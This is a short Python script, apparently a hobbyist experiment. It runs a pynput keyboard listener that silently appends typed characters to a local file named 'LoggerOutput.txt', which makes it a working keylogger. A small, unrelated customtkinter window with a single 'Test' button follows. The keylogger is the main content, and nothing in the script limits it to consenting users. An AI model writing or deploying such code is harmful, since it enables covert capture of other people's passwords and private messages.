from pynput import keyboard
from tkinter import *
import customtkinter

def keyPressed(key):
    print(str(key))
    with open("LoggerOutput.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting the character (aka a misfire)")

if __name__ == "__main__":
    logger = keyboard.Listener(on_press=keyPressed)
    logger.start()
    input()


customtkinter.set_appearance_mode("dark")

customtkinter.set_default_color_theme("blue")

root = customtkinter.CTk()

root.geometry("300x400")

button = customtkinter.CTkButton(master=root, text="Test")

button.place(relx=0.5, rely=0.5, anchor=CENTER)

root.mainloop()